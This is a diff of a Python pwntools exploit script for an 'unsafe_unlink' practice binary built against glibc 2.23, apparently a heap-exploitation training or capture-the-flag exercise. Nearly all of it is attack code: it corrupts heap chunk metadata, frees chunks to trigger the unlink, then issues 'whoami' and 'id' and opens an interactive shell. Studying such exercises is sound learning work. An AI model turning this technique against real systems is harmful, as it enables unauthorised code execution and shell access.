@@ -8,6 +8,11 @@ context.binary = elf = ELF('./unsafe_unlink', checksec=False)
 libc = ELF('../.glibc/glibc_2.23_unsafe-unlink/libc.so.6', checksec=False)
 #libc = elf.libc
 
+environ = {
+    'LD_PRELOAD': '../.glibc/glibc_2.23_unsafe-unlink/libc.so.6',
+    'LD_LIBRARY_PATH': '../.glibc/glibc_2.23_unsafe-unlink/'
+}
+
 gs = """
 b *main
 b *main+265
@@ -47,14 +52,15 @@ def edit(index, data):
 def free(index):
     io.send(b'3')
     io.sendafter(b'index: ', str(index).encode())
-    io.recvuntil(b'> ')
+    
 
 def exit():
     io.send(b'4')
 
 
 io = start()
-#io.timeout = 0.1
+# Turn off this for debugging
+io.timeout = 0.1
 io.recvuntil(b'puts() @ ')
 puts = int(io.recvline(), 16)
 io.recvuntil(b'heap @ ')
@@ -64,8 +70,6 @@ info("puts: " + hex(puts))
 info("libc base: " + hex(libc.address))
 info("heap: " + hex(heap))
 io.recvuntil(b'> ')
-
-
 
 chunk_a = malloc(0x88)
 chunk_b = malloc(0x88)
@@ -87,6 +91,8 @@ payload += size_B
 edit(chunk_a, payload)
 
 free(chunk_b)
-#free(chunk_a)
-
+io.recvuntil(b'> ')
+free(chunk_a)
+io.sendline(b'whoami')
+io.sendline(b'id')
 io.interactive()
